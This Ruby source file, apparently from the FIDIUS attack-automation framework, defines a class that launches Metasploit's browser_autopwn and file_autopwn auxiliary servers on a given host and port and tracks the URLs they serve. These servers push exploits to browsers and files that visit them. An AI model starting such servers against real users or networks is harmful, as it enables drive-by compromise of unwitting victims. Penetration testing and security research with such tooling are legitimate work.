module FIDIUS
  module Action
    module Exploit
      class Passive
        include Singleton

        def initialize
          @running = []
        end

        def start_browser_autopwn(lhost, port = 8090)
          start_passive_exploit("server/browser_autopwn", lhost, '/', port)
        end

        def start_file_autopwn(lhost, port = 8090)
          start_passive_exploit("server/file_autopwn", lhost, 'file', port)
        end

        def running_actions
          @running
        end

private

        def start_passive_exploit(auxiliary, lhost, path, port)
          url = "http://#{lhost}:#{port}/#{path.sub /^\//, ""}"
          @running << {:url => url, :type => auxiliary, :lhost => lhost, :lport => port }
          options = {'LHOST' => lhost, 'SRVHOST' => lhost, 'URIPATH' => path, 'SRVPORT' => port }
          FIDIUS::Action::Msf.instance.run_auxiliary(auxiliary, options,false)
          return url
        end

      end # class Passive
    end # module Exploit
  end # module Action
end # module FIDIUS

